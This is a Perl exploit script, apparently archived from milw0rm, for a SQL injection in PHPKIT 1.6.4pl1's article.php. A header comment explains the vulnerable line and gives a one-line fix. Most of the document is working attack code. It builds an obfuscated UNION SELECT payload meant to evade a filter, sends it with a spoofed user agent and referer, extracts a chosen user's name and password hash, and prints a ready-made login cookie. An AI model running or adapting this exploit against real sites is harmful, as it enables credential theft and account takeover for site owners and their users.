<html><head><title>PHPKIT 1.6.4pl1 article.php Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#  Vulnerability found &amp; exploit written by $h4d0wl33t (shadowleet)
#  Contact: shadowleet@safe-mail.net
#   Phpkit 1.6.4pl1 Non Public Exploit by $hadowleet,
#   Description:
#   Vulnerability in file pkinc/public/article.php
#   On line 71:
#
#   $contentid=(!$contentid &amp;&amp; isset($_REQUEST['contentid'])
#   &amp;&amp; intval($_REQUEST['contentid'])&gt;0) ? $_REQUEST['contentid'] : $contentid;
#
#   $contentid gets initialized normal but not going through safe function $sql-&gt;f in sql statement
#
#   Use in sql statement:
#   $contentinfo=$DB-&gt;fetch_array($DB-&gt;query
#   (&quot;SELECT * FROM &quot;.$db_tab['content'].&quot; where content_id='&quot;.$contentid.&quot;' LIMIT 1&quot;))
#
#   Security fix:
#   Replace:
#   &amp;&amp; intval($_REQUEST['contentid'])&gt;0) ? $_REQUEST['contentid'] : $contentid;
#   with : 
#   &amp;&amp; intval($_REQUEST['contentid'])&gt;0) ? intval($_REQUEST['contentid']) : $contentid;
#
#   Conditions:
#   1. Magic_quotes needs to be off
#   2. There must be any articles in the database.
#   Have fun :)
#_________________________________________________
use LWP;
use HTTP::Request;
use Getopt::Long;

sub header
{
print &quot;\n&quot;;
print &quot;                 ###################################################\n&quot;;
print &quot;                 #Phpkit 1.6.4pl1 Non Public Exploit by \$hadowleet #\n&quot;;
print &quot;                 #              + Hackblock 2007 bypass            #\n&quot;;
print &quot;                 ###################################################\n&quot;;
print &quot;\n&quot;;
}
sub usage
{
  print &quot;-------------------------------------------------------------------------------------\n&quot;;
  print &quot;|   Usage:                                                                          |\n&quot;;
  print &quot;|   exploit.pl                                                                      |\n&quot;;
  print &quot;|  -url    [URL] (http://phpkit.de                                                  |\n&quot;;
  print &quot;|  -uid    [userid] (1)                                                             |\n&quot;;
  print &quot;|  -pre    [databaseprefix] (phpkit)                                                |\n&quot;;
  print &quot;|  -p      [proxy]  (http://proxyip:port)                                           |\n&quot;;
  print &quot;|                                                                                   |\n&quot;;               
  print &quot;|   Example:                                                                        |\n&quot;;
  print &quot;|   exploit.pl -url http://phpkit.de/ -cat 2 -uid 1 -pre phpkit                     |\n&quot;;
  print &quot;|                                                                                   |\n&quot;;
  print &quot;|   Or for standard Values:                                                         |\n&quot;;
  print &quot;|   exploit.pl -url http://phpkit.de/                                               |\n&quot;;
  print &quot;|                                                                                   |\n&quot;;
  print &quot;|   You need a valid category id, you can get it when you open the link             |\n&quot;;
  print &quot;|   http://page.de/include.php?path=contentarchive&amp;type=1                           |\n&quot;;
  print &quot;|   and click on one article, then read in the url the catid number and use it      |\n&quot;;
  print &quot;|   Standard value for catid is 2                                                   |\n&quot;;
  print &quot;-------------------------------------------------------------------------------------\n&quot;;
}                                                                                 

my %parameter = ();
GetOptions(\%parameter, &quot;url=s&quot;, &quot;uid=i&quot;, &quot;pre=s&quot;, &quot;p=s&quot;, &quot;cat=i&quot;);
$url = $parameter{&quot;url&quot;};
$uid = $parameter{&quot;uid&quot;};
$cat = $parameter{&quot;cat&quot;};
$prefix = $parameter{&quot;pre&quot;};
$proxy =  $parameter{&quot;p&quot;};
if(!$url)
{
header();
usage();
exit;
}
if($url !~ /\//){$url = $url.&quot;/&quot;;}
if($url !~ /http:\/\//){$url = &quot;http://&quot;.$url;}
if($proxy)
{
if($proxy !~ /http:\/\//){die (&quot;Proxy format must be: \&quot;http://ip:port\&quot;\n&quot;);}
}
if(!$cat){$cat = 2;}
if(!$uid){$uid = 1;}
if(!$prefix){$prefix = &quot;phpkit&quot;;}
$bugfile = &quot;include.php?path=article&quot;;
$sqlinjection = &quot;9999999999'/**/UnIoN/**/SeLeCt/**/1,&quot;.$cat.&quot;,3,CoNcAt('Login:',user_name),5,CoNcAt('Password:',user_pw),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25/**/FrOm/**/&quot;.$prefix.&quot;_user/**/WhErE/**/user_id=&quot;.$uid.&quot;/*--&quot;;
$poststring = &quot;contentid=&quot;.$sqlinjection;
$imgcode = 0;
 
sub Exploit()
{
$requestpage = $url.$bugfile;
print &quot;Requesting Page: &quot;.$requestpage.&quot;\n&quot;;
my $req  = HTTP::Request-&gt;new(&quot;POST&quot;,$requestpage);
$ua = LWP::UserAgent-&gt;new;
if($proxy){$ua-&gt;proxy( 'http', $proxy );}
$ua-&gt;agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req-&gt;referer($url);
$req-&gt;referer(&quot;http://www.deinemudda.de&quot;);
$req-&gt;content_type('application/x-www-form-urlencoded');
$contlen = length($poststring);
$req-&gt;header(&quot;content-length&quot; =&gt; $contlen);
$req-&gt;content($poststring);
$response = $ua-&gt;request($req);
$content = $response-&gt;content;
$header = $response-&gt;headers_as_string();
#Debug Modus delete # at beginning of next line
#print $content;
@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/&lt;\/a&gt;/,$name);
$name = @name[0];
@password = split(/Password:/,$content);
$password = @password[1];
@password = split(/&lt;\/font&gt;/,$password);
$password = @password[0];
if(!$name &amp;&amp; !$password)
{
print &quot;\n\n&quot;;
print &quot;!Exploit failed, ~Magic quotes on~ or article id doesn't exists, just read usage!\n\n&quot;;
exit;
}
print &quot;Data:\n&quot;;
print &quot;-----------------------------------------------------\n&quot;;
print &quot;Name: &quot; .$name.&quot;\n&quot;;
print &quot;Password: &quot; .$password.&quot;\n\n&quot;;
print &quot;Logincookie-&gt;:\nuser_id%3E&quot;.$uid.&quot;%2Cuser_name%3E&quot;.$name.&quot;%2Cuser_pw%3E&quot;.$password.&quot;\n\n&quot;;
print &quot;-----------------------------------------------------\n&quot;;
print &quot;Enjoy the day :)\n&quot;;
}
#Starting
print &quot;\n\nExploiting...\n&quot;;
Exploit();
#End
#Copyright by $h4d0wl33t 2007

# milw0rm.com [2007-11-22]</pre></html>